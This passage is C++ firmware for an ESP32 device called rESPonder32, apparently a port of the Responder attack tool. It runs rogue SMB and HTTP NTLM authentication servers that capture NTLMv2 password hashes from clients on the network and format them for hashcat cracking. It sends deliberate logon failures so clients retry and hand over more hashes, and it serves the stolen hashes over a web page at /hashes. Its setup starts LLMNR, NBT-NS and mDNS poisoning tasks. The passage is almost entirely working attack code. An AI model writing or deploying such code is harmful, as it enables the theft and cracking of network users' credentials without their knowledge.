    auto bput8  = [&](uint8_t v)  { if (bw < (int)sizeof(body)) body[bw++] = v; };
    auto bput16 = [&](uint16_t v) { bput8(v & 0xFF); bput8(v >> 8); };

    int andxoff = 32 + 9 + bcc;

    bput8(0x04);                     // WordCount = 4
    bput8(0xff);                     // AndXCommand = none
    bput8(0x00);                     // Reserved
    bput16((uint16_t)andxoff);       // AndXOffset
    bput16(0x0000);                  // Action = 0
    bput16((uint16_t)spnegolen);     // SecurityBlobLength
    bput16((uint16_t)bcc);           // ByteCount

    if (bw + spnegolen > (int)sizeof(body)) return -1;
    memcpy(body + bw, spnego, spnegolen); bw += spnegolen;

    memcpy(body + bw, nativeos, noslen); bw += noslen;
    bput8(0x00); bput8(0x00);

    memcpy(body + bw, nativelan, nlanlen); bw += nlanlen;
    bput8(0x00); bput8(0x00);
#pragma GCC diagnostic pop

    if (32 + bw > dstsz) return -1;
    int hw = buildSMBHeader(dst, dstsz, 0x73, 0x88, 0x01c8,
                             0xc0000016, pid, uid, 0, mid);
    if (hw < 0) return -1;
    memcpy(dst + hw, body, bw);
    return hw + bw;
}

// Parse an NTLMSSP Type 3 message embedded in an SMB packet.
// Locates NTLMSSP\x00 signature first, then delegates to hash_formatter.h.
// Formats into a malloc'd hashcat string and hands off to addCapturedHash.
static void parseSMBNTLMv2(const uint8_t* data, int dlen,
                             const uint8_t challenge[8],
                             const char* client_ip) {
    int start = findNTLMSSP(data, dlen);
    if (start < 0) {
        Serial.printf("[SMB] NTLMSSP signature not found from %s\n", client_ip);
        return;
    }
    char out[4096] = {};
    if (formatNTLMHash(data + start, dlen - start, challenge, out, sizeof(out))) {
        Serial.printf("[SMB] Hash from %s: %s\n", client_ip, out);
        addCapturedHash(out);
    } else {
        Serial.printf("[SMB] Anonymous or malformed auth from %s\n", client_ip);
    }
}

// Handle one SMB client through its three-PDU NTLM exchange.
static void handleSMBClient(WiFiClient client) {
    char client_ip[32] = "unknown";
    {
        struct sockaddr_in peer{};
        socklen_t plen = sizeof(peer);
        if (getpeername(client.fd(), (struct sockaddr*)&peer, &plen) == 0)
            inet_ntop(AF_INET, &peer.sin_addr, client_ip, sizeof(client_ip));
    }

    Serial.printf("[SMB] Connection from %s\n", client_ip);

    int fd = client.fd();
    uint8_t buf[4096];
    uint8_t resp[4096];

    // Step 1: Negotiate (0x72)
    int plen = recvSMBPDU(fd, buf, sizeof(buf));
    if (plen < 10 || buf[0] != 0xFF || buf[1] != 'S' || buf[2] != 'M' ||
        buf[3] != 'B' || buf[4] != 0x72) {
        Serial.printf("[SMB] Bad negotiate from %s\n", client_ip);
        return;
    }
    Serial.printf("[SMB] Negotiate from %s\n", client_ip);

    int rlen = buildNegotiateResponse(buf, plen, resp, sizeof(resp), g_smbChallenge);
    if (rlen < 0 || !sendSMBPDU(fd, resp, rlen)) {
        Serial.printf("[SMB] Failed negotiate response to %s\n", client_ip);
        return;
    }

    // Step 2: First Session Setup (Type 1 NTLMSSP — we echo with challenge)
    plen = recvSMBPDU(fd, buf, sizeof(buf));
    if (plen < 10 || buf[4] != 0x73) {
        Serial.printf("[SMB] Expected 0x73, got 0x%02x from %s\n", buf[4], client_ip);
        return;
    }

    rlen = buildSessionSetupChallenge(buf, plen, resp, sizeof(resp), g_smbChallenge);
    if (rlen < 0 || !sendSMBPDU(fd, resp, rlen)) {
        Serial.printf("[SMB] Failed challenge response to %s\n", client_ip);
        return;
    }
    Serial.printf("[SMB] Challenge sent to %s\n", client_ip);

    // Step 3: Second Session Setup (Type 3 — the hash)
    plen = recvSMBPDU(fd, buf, sizeof(buf));
    if (plen < 10 || buf[4] != 0x73) {
        Serial.printf("[SMB] Expected second 0x73, got 0x%02x from %s\n", buf[4], client_ip);
        return;
    }

    parseSMBNTLMv2(buf, plen, g_smbChallenge, client_ip);

    // Send STATUS_LOGON_FAILURE so the client retries — captures more hashes.
    uint16_t lpid = (uint16_t)buf[30] | ((uint16_t)buf[31] << 8);
    uint16_t luid = (uint16_t)buf[32] | ((uint16_t)buf[33] << 8);
    uint16_t lmid = (uint16_t)buf[34] | ((uint16_t)buf[35] << 8);
    uint8_t empty[3] = { 0x00, 0x00, 0x00 };
    int hw = buildSMBHeader(resp, sizeof(resp), 0x73, 0x98, 0x01c8,
                             0xc000006dUL, lpid, luid, 0, lmid);
    if (hw > 0) {
        memcpy(resp + hw, empty, 3);
        sendSMBPDU(fd, resp, hw + 3);
    }
}

static void task_smb(void* pv) {
    (void)pv;

    static const uint16_t SMB_PORT         = 445;
    static const uint16_t SMB_FALLBACK_PORT = 4450;

    WiFiServer srv(SMB_PORT);
    srv.begin();
    uint16_t actual_port = SMB_PORT;

    if (!srv) {
        Serial.printf("[SMB] Port %d failed (need root?), falling back to %d\n",
                      SMB_PORT, SMB_FALLBACK_PORT);
        srv.~WiFiServer();
        new (&srv) WiFiServer(SMB_FALLBACK_PORT);
        srv.begin();
        actual_port = SMB_FALLBACK_PORT;
    }

    if (!srv) {
        Serial.println("[SMB] WARN: could not bind on any port; SMB capture disabled");
        vTaskDelete(NULL);
        return;
    }

    Serial.printf("[SMB] Listening on TCP %d\n", actual_port);

    for (;;) {
        WiFiClient c = srv.available();
        if (c) handleSMBClient(std::move(c));
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }
}

// ===========================================================================
// HTTP NTLM server — TCP 80 (or 8081 fallback)
// ===========================================================================

// Minimal base64 decoder. Returns decoded byte count or -1.
static int b64decode(const char* in, int inlen, uint8_t* out, int outmax) {
    static const signed char T[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1, 0,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
    };
    int w = 0, acc = 0, bits = 0;
    for (int i = 0; i < inlen; i++) {
        unsigned char c = (unsigned char)in[i];
        if (c == '=') break;
        signed char v = T[c];
        if (v < 0) continue;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            if (w >= outmax) return -1;
            out[w++] = (uint8_t)(acc >> bits);
        }
    }
    return w;
}

// Minimal base64 encoder. Returns bytes written (no null terminator).
static int b64encode(const uint8_t* in, int inlen, char* out, int outmax) {
    static const char C[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int w = 0;
    for (int i = 0; i < inlen; i += 3) {
        uint32_t v = (uint32_t)in[i] << 16;
        if (i + 1 < inlen) v |= (uint32_t)in[i + 1] << 8;
        if (i + 2 < inlen) v |= in[i + 2];
        int rem = inlen - i;
        if (w + 4 > outmax) return -1;
        out[w++] = C[(v >> 18) & 0x3F];
        out[w++] = C[(v >> 12) & 0x3F];
        out[w++] = (rem > 1) ? C[(v >> 6) & 0x3F] : '=';
        out[w++] = (rem > 2) ? C[v & 0x3F]         : '=';
    }
    return w;
}

// Build a raw NTLMSSP Type 2 Challenge for the HTTP path.
// Layout follows Responder packets.py:NTLMChallenge field-by-field.
// NegFlags 0x05 0x02 0x89 0xa2 = with ESS.
// OS version bytes: Windows 10 / Server 2022 (per CLAUDE.md HTTP server notes).
static int buildHTTPNTLMChallenge(uint8_t* dst, int dstmax,
                                   const uint8_t challenge[8]) {
    // TargetName = HTTP_SERVER_NAME as UTF-16LE
    uint8_t targetName[64];
    int targetNameLen = 0;
    for (int i = 0; HTTP_SERVER_NAME[i]; i++) {
        if (targetNameLen + 2 > (int)sizeof(targetName)) return -1;
        targetName[targetNameLen++] = (uint8_t)HTTP_SERVER_NAME[i];
        targetName[targetNameLen++] = 0x00;
    }

    // AvPairs (all UTF-16LE). Order from packets.py:NTLMChallenge:
    //   MsvAvNbDomainName  (0x0002)
    //   MsvAvNbComputerName (0x0001)
    //   MsvAvDnsDomainName  (0x0004)
    //   MsvAvDnsComputerName (0x0003)
    //   MsvAvDnsTreeName    (0x0005)
    //   MsvAvEOL            (0x0000)
    uint8_t nameUtf16[64];
    int     nameUtf16Len = 0;
    for (int i = 0; HTTP_SERVER_NAME[i]; i++) {
        nameUtf16[nameUtf16Len++] = (uint8_t)HTTP_SERVER_NAME[i];
        nameUtf16[nameUtf16Len++] = 0x00;
    }

    uint8_t avpairs[512];
    int     avlen = 0;
    auto avWrite = [&](uint16_t id, const uint8_t* val, uint16_t vlen) {
        avpairs[avlen++] = (uint8_t)(id & 0xFF);
        avpairs[avlen++] = (uint8_t)(id >> 8);
        avpairs[avlen++] = (uint8_t)(vlen & 0xFF);
        avpairs[avlen++] = (uint8_t)(vlen >> 8);
        memcpy(avpairs + avlen, val, vlen);
        avlen += vlen;
    };

    avWrite(0x0002, nameUtf16, (uint16_t)nameUtf16Len);
    avWrite(0x0001, nameUtf16, (uint16_t)nameUtf16Len);
    avWrite(0x0004, nameUtf16, (uint16_t)nameUtf16Len);
    avWrite(0x0003, nameUtf16, (uint16_t)nameUtf16Len);
    avWrite(0x0005, nameUtf16, (uint16_t)nameUtf16Len);
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00;
    avpairs[avlen++] = 0x00; avpairs[avlen++] = 0x00;

    uint32_t targetNameOffset = 56;
    uint32_t targetInfoOffset = targetNameOffset + (uint32_t)targetNameLen;
    int total = (int)(targetInfoOffset + avlen);
    if (total > dstmax) return -1;

    int w = 0;
    auto put8  = [&](uint8_t v)  { dst[w++] = v; };
    auto put16 = [&](uint16_t v) { dst[w++] = (uint8_t)(v & 0xFF); dst[w++] = (uint8_t)(v >> 8); };
    auto put32 = [&](uint32_t v) { put16((uint16_t)(v & 0xFFFF)); put16((uint16_t)(v >> 16)); };
    auto putBuf = [&](const uint8_t* src, int n) { memcpy(dst + w, src, n); w += n; };

    const uint8_t sig[] = {'N','T','L','M','S','S','P',0x00};
    putBuf(sig, 8);
    put32(2);                             // MessageType = CHALLENGE
    put16((uint16_t)targetNameLen);       // TargetNameLen
    put16((uint16_t)targetNameLen);       // TargetNameMaxLen
    put32(targetNameOffset);              // TargetNameOffset = 56

    // NegotiateFlags: 0x05 0x02 0x89 0xa2 (ESS enabled, from Responder HTTP path)
    put8(0x05); put8(0x02); put8(0x89); put8(0xa2);

    putBuf(challenge, 8);                 // ServerChallenge
    for (int i = 0; i < 8; i++) put8(0x00);  // Reserved

    put16((uint16_t)avlen);               // TargetInfoLen
    put16((uint16_t)avlen);               // TargetInfoMaxLen
    put32(targetInfoOffset);              // TargetInfoOffset

    // OS Version: Windows 10 / Server 2022 (CLAUDE.md HTTP server spec)
    put8(0x0a); put8(0x00);              // Major=10, Minor=0
    put8(0x7c); put8(0x4f);              // Build=20348
    put8(0x00); put8(0x00); put8(0x00); // Reserved3
    put8(0x0f);                          // NTLMRevision=15

    putBuf(targetName, targetNameLen);
    putBuf(avpairs, avlen);

    return w;
}

// Build HTTP 401 with bare WWW-Authenticate: NTLM.
static int build401Initial(char* dst, int dstmax) {
    return snprintf(dst, (size_t)dstmax,
        "HTTP/1.1 401 Unauthorized\r\n"
        "WWW-Authenticate: NTLM\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n");
}

// Build HTTP 401 with WWW-Authenticate: NTLM <base64(Type2)>.
static int build401Challenge(char* dst, int dstmax, const uint8_t challenge[8]) {
    uint8_t msg2[512];
    int msg2len = buildHTTPNTLMChallenge(msg2, sizeof(msg2), challenge);
    if (msg2len < 0) return -1;

    char b64[700];
    int b64len = b64encode(msg2, msg2len, b64, (int)sizeof(b64) - 1);
    if (b64len < 0) return -1;
    b64[b64len] = '\0';

    return snprintf(dst, (size_t)dstmax,
        "HTTP/1.1 401 Unauthorized\r\n"
        "WWW-Authenticate: NTLM %s\r\n"
        "Content-Length: 0\r\n"
        "Connection: keep-alive\r\n"
        "\r\n",
        b64);
}

// Build HTTP 200 OK (end of NTLM exchange).
static int build200OK(char* dst, int dstmax) {
    return snprintf(dst, (size_t)dstmax,
        "HTTP/1.1 200 OK\r\n"
        "Content-Type: text/html\r\n"
        "Content-Length: 0\r\n"
        "Connection: close\r\n"
        "\r\n");
}

// Find "Authorization: NTLM " or "Authorization: Negotiate " in raw HTTP headers.
// Copies the base64 token into token_out. Returns token length or 0.
static int extractNTLMToken(const char* headers, int hlen,
                             char* token_out, int token_max) {
    const char* needles[2] = { "Authorization: NTLM ", "Authorization: Negotiate " };
    const char* p   = headers;
    const char* end = headers + hlen;

    while (p < end) {
        const char* nl = (const char*)memchr(p, '\n', end - p);
        int linelen = nl ? (int)(nl - p) : (int)(end - p);
        for (int ni = 0; ni < 2; ni++) {
            int nlen = (int)strlen(needles[ni]);
            if (linelen > nlen && memcmp(p, needles[ni], (size_t)nlen) == 0) {
                int toklen = linelen - nlen;
                while (toklen > 0 && (p[nlen + toklen - 1] == '\r' ||
                                      p[nlen + toklen - 1] == '\n'))
                    toklen--;
                if (toklen >= token_max) toklen = token_max - 1;
                memcpy(token_out, p + nlen, (size_t)toklen);
                token_out[toklen] = '\0';
                return toklen;
            }
        }
        p = nl ? nl + 1 : end;
    }
    return 0;
}

// Handle one HTTP client through its full NTLM three-leg exchange.
static void handleHTTPClient(WiFiClient& client) {
    char clientIP[32] = "unknown";
    {
        struct sockaddr_in peer{};
        socklen_t plen = sizeof(peer);
        if (getpeername(client.fd(), (struct sockaddr*)&peer, &plen) == 0)
            inet_ntop(AF_INET, &peer.sin_addr, clientIP, sizeof(clientIP));
    }

    Serial.printf("[HTTP] Connection from %s\n", clientIP);

    char rxbuf[4096];
    char txbuf[1024];

    for (int leg = 0; leg < 3 && client.connected(); leg++) {
        int  rlen       = 0;
        bool gotHeaders = false;
        client.setTimeout(3000);

        while (rlen < (int)sizeof(rxbuf) - 1) {
            int c = client.read();
            if (c < 0) break;
            rxbuf[rlen++] = (char)c;
            if (rlen >= 4 &&
                rxbuf[rlen-4] == '\r' && rxbuf[rlen-3] == '\n' &&
                rxbuf[rlen-2] == '\r' && rxbuf[rlen-1] == '\n') {
                gotHeaders = true;
                break;
            }
        }
        rxbuf[rlen] = '\0';

        if (!gotHeaders || rlen < 4) {
            Serial.printf("[HTTP] Incomplete headers from %s (leg %d)\n", clientIP, leg);
            break;
        }

        char token[2048] = {};
        int toklen = extractNTLMToken(rxbuf, rlen, token, sizeof(token));

        if (toklen == 0) {
            int n = build401Initial(txbuf, sizeof(txbuf));
            client.write((uint8_t*)txbuf, (size_t)n);
            Serial.printf("[HTTP] Sent 401 initial to %s\n", clientIP);
            continue;
        }

        uint8_t ntlmbuf[2048];
        int ntlmlen = b64decode(token, toklen, ntlmbuf, sizeof(ntlmbuf));
        if (ntlmlen < 9) {
            Serial.printf("[HTTP] Malformed NTLM token from %s\n", clientIP);
            break;
        }

        // Byte 8 of the decoded blob is the NTLM message type (1 or 3).
        uint8_t msgType = ntlmbuf[8];

        if (msgType == 0x01) {
            Serial.printf("[HTTP] Type 1 from %s\n", clientIP);
            int n = build401Challenge(txbuf, sizeof(txbuf), g_httpChallenge);
            if (n < 0) { Serial.println("[HTTP] Failed to build Type 2"); break; }
            client.write((uint8_t*)txbuf, (size_t)n);
            Serial.printf("[HTTP] Type 2 challenge sent to %s\n", clientIP);
        } else if (msgType == 0x03) {
            Serial.printf("[HTTP] Type 3 from %s\n", clientIP);
            // The blob starts at ntlmbuf[0] which is the NTLMSSP signature.
            char out[4096] = {};
            if (formatNTLMHash(ntlmbuf, ntlmlen, g_httpChallenge, out, sizeof(out))) {
                Serial.printf("[HTTP] Hash from %s: %s\n", clientIP, out);
                addCapturedHash(out);
            } else {
                Serial.printf("[HTTP] Anonymous or malformed auth from %s\n", clientIP);
            }
            int n = build200OK(txbuf, sizeof(txbuf));
            client.write((uint8_t*)txbuf, (size_t)n);
            break;
        } else {
            Serial.printf("[HTTP] Unexpected NTLM type %d from %s\n", msgType, clientIP);
            break;
        }
    }

    client.stop();
}

static void task_http(void* pv) {
    (void)pv;

    static const uint16_t HTTP_PORT         = 80;
    static const uint16_t HTTP_FALLBACK_PORT = 8081;

    WiFiServer srv(HTTP_PORT);
    srv.begin();
    uint16_t actual_port = HTTP_PORT;

    if (!srv) {
        Serial.printf("[HTTP] Port %d failed (need root?), falling back to %d\n",
                      HTTP_PORT, HTTP_FALLBACK_PORT);
        srv.~WiFiServer();
        new (&srv) WiFiServer(HTTP_FALLBACK_PORT);
        srv.begin();
        actual_port = HTTP_FALLBACK_PORT;
    }

    if (!srv) {
        Serial.println("[HTTP] WARN: could not bind on any port; HTTP capture disabled");
        vTaskDelete(NULL);
        return;
    }

    Serial.printf("[HTTP] Listening on TCP %d\n", actual_port);

    for (;;) {
        WiFiClient c = srv.available();
        if (c) handleHTTPClient(c);
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }
}

// ===========================================================================
// Web UI task — WebServer on 8080, /hashes and /
// ===========================================================================

static void task_web(void* pv) {
    (void)pv;

    // Routes were registered and g_webServer.begin() was called in setup().
    Serial.println("[WEB] WebServer task running on port 8080");

    for (;;) {
        g_webServer.handleClient();
        vTaskDelay(1 / portTICK_PERIOD_MS);
    }
}

// ===========================================================================
// Arduino entry points
// ===========================================================================

void setup() {
    Serial.begin(115200);
    Serial.println("\n[rESPonder32] Starting up");

    // 1. WiFi
    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    Serial.print("[rESPonder32] Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
        delay(100);
        Serial.print('.');
    }
    Serial.println();

    // 2. Detect host IP
    detectHostIP(g_ourIP);
    Serial.printf("[rESPonder32] Host IP: %d.%d.%d.%d\n",
                  g_ourIP[0], g_ourIP[1], g_ourIP[2], g_ourIP[3]);

    // 3. Generate challenges — two 32-bit randoms each to get 8 bytes.
    {
        uint32_t r1 = esp_random(), r2 = esp_random();
        memcpy(g_smbChallenge,     &r1, 4);
        memcpy(g_smbChallenge + 4, &r2, 4);
    }
    {
        uint32_t r1 = esp_random(), r2 = esp_random();
        memcpy(g_httpChallenge,     &r1, 4);
        memcpy(g_httpChallenge + 4, &r2, 4);
    }
    Serial.printf("[rESPonder32] SMB  challenge: %02x%02x%02x%02x%02x%02x%02x%02x\n",
                  g_smbChallenge[0], g_smbChallenge[1],
                  g_smbChallenge[2], g_smbChallenge[3],
                  g_smbChallenge[4], g_smbChallenge[5],
                  g_smbChallenge[6], g_smbChallenge[7]);
    Serial.printf("[rESPonder32] HTTP challenge: %02x%02x%02x%02x%02x%02x%02x%02x\n",
                  g_httpChallenge[0], g_httpChallenge[1],
                  g_httpChallenge[2], g_httpChallenge[3],
                  g_httpChallenge[4], g_httpChallenge[5],
                  g_httpChallenge[6], g_httpChallenge[7]);

    // 4. Mutex for the hash list
    g_hashMutex = xSemaphoreCreateMutex();

    // 5. WebServer routes
    g_webServer.on("/", HTTP_GET, []() {
        g_webServer.send(200, "text/plain",
            "rESPonder32 - GET /hashes for captured NTLM hashes\n");
    });
    g_webServer.on("/hashes", HTTP_GET, []() {
        if (g_hashMutex) xSemaphoreTake(g_hashMutex, portMAX_DELAY);
        std::string body;
        for (auto& h : g_capturedHashes) { body += h; body += '\n'; }
        if (g_hashMutex) xSemaphoreGive(g_hashMutex);
        g_webServer.send(200, "text/plain", body.c_str());
    });
    g_webServer.onNotFound([]() {
        g_webServer.send(404, "text/plain", "Not found\n");
    });
    g_webServer.begin();

    Serial.printf("[rESPonder32] WebServer on port 8080 — GET http://%d.%d.%d.%d:8080/hashes\n",
                  g_ourIP[0], g_ourIP[1], g_ourIP[2], g_ourIP[3]);

    // 6. Launch tasks
    xTaskCreate(task_llmnr, "llmnr", 4096, nullptr, 5, nullptr);
    xTaskCreate(task_nbtns, "nbtns", 4096, nullptr, 5, nullptr);
    xTaskCreate(task_mdns,  "mdns",  4096, nullptr, 5, nullptr);
    xTaskCreate(task_smb,   "smb",   8192, nullptr, 5, nullptr);
    xTaskCreate(task_http,  "http",  8192, nullptr, 5, nullptr);
    xTaskCreate(task_web,   "web",   4096, nullptr, 3, nullptr);

    Serial.println("[rESPonder32] All tasks started");
}

void loop() {
    delay(1000);
}
